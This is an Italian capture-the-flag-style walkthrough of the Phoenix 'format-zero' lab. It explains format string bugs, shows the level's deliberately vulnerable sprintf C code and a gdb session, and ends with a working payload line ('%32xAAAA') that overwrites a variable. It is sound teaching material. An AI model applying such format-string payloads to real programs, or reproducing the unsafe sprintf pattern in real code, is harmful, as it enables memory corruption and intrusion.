### Descrizione del Codice

Il programma `format_zero.c` introduce le stringhe di formato e come le stringhe di formato fornite dall'attaccante possano modificare l'esecuzione del programma.

### Funzionamento del Programma

1. Il programma legge un input dall'utente e lo memorizza in `buffer`.
2. Copia il contenuto di `buffer` in `locals.dest` usando `sprintf`.
3. Controlla se la variabile `changeme` è stata modificata.

### Problema di Sicurezza

Il problema di sicurezza risiede nell'uso della funzione `sprintf` con un input controllato dall'utente senza specificare un formato, il che può causare una vulnerabilità di formato. Questo può essere sfruttato per scrivere un valore specifico nella variabile `changeme`.

### Exploit

L'exploit sfrutta la vulnerabilità di formato per scrivere un valore specifico nella variabile `changeme`.

### Esempio di Exploit

Il seguente esempio mostra come sfruttare la vulnerabilità:

```c
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char dest[32];
    volatile int changeme;
  } locals;
  char buffer[16];

  printf("%s\n", BANNER);

  if (fgets(buffer, sizeof(buffer) - 1, stdin) == NULL) {
    errx(1, "Unable to get buffer");
  }
  buffer[15] = 0;

  locals.changeme = 0;

  sprintf(locals.dest, buffer);

  if (locals.changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed!");
  } else {
    puts(
        "Uh oh, 'changeme' has not yet been changed. Would you like to try "
        "again?");
  }

  exit(0);
}

Per imparare di più sulla vulnerabilità delle stringhe di formato, consulta i riferimenti alla fine.

Questo codice utilizza la funzione sprintf per scrivere la stringa formattata buffer in dest.

Il bug qui è che se inseriamo una stringa di formato come %d senza argomenti aggiuntivi (un numero in questo caso) potremmo rivelare alcuni valori dello stack.

Per esempio:
int main() {
    printf("%x.%x.%x");
}

output: d0a8b868 d0a8b878 3c43b1b0
Come puoi vedere, siamo stati in grado di rivelare alcuni indirizzi dello stack.

Tornando al nostro livello, dobbiamo sovrascrivere dest per sovrascrivere changeme, ma il buffer è troppo piccolo per farlo, quindi possiamo usare il trucco della stringa di formato per risolvere questo problema.

Come hai visto, un %x stampa 8 caratteri, quindi possiamo inserire: (4 %x + valore di changeme).

Possiamo anche inserire un solo %x con un padding di 32 byte come questo: (%32x + valore di changeme).

user@phoenix-amd64:~$ gdb -q /opt/phoenix/amd64/format-zero 
Reading symbols from /opt/phoenix/amd64/format-zero...(no debugging symbols found)...done.

gef➤  disassemble main 
Dump of assembler code for function main:
.....
   0x0000000000400700 <+99>:	mov    eax,0x0
   0x0000000000400705 <+104>:	call   0x400500 <sprintf@plt>
   0x000000000040070a <+109>:	mov    eax,DWORD PTR [rbp-0x10]
.....

gef➤  b *0x000000000040070a
Breakpoint 1 at 0x40070a

gef➤  r
Starting program: /opt/phoenix/amd64/format-zero 
Welcome to phoenix/format-zero, brought to you by https://exploit.education
%32xAAAAAAAA

gef➤  x/5xg $rbp-0x30
0x7fffffffe620:	0x2020202020202020	0x2020202020202020
0x7fffffffe630:	0x2020202020202020	0x3031366566666666
0x7fffffffe640:	0x0000000a41414141

Soluzione
$ echo "%32xAAAA" | /opt/phoenix/amd64/format-zero 